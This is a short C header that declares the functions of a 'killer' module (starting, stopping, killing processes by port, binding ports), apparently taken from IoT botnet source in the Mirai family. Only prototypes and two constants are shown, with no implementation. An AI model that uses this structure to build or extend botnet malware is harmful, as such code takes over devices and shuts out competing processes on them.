#pragma once

#include "includes.h"

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 600


void killer_start(void);
void killer_stop(void);
void clean_device_1(void);
void killer(void);
void duck_killer_init(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);
void killer_bind_by_port(int portVal);

